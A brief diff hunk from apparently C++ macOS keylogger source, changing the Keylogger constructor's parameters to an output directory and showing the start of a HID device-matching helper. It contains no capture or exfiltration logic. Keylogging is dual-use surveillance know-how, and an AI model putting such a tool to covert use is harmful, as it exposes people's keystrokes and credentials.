@@ -6,7 +6,7 @@
 
 #include "recorder.hpp"
 
-Keylogger::Keylogger(const std::string& out_path, bool record_virtual) : recorder_(out_path, record_virtual) {}
+Keylogger::Keylogger(const std::string& out_dir) : recorder_(out_dir) {}
 
 CFMutableDictionaryRef Keylogger::CreateMatchingCriteria(std::unordered_map<const char*, int> criteria) {
   CFMutableDictionaryRef dictionary = CFDictionaryCreateMutable(
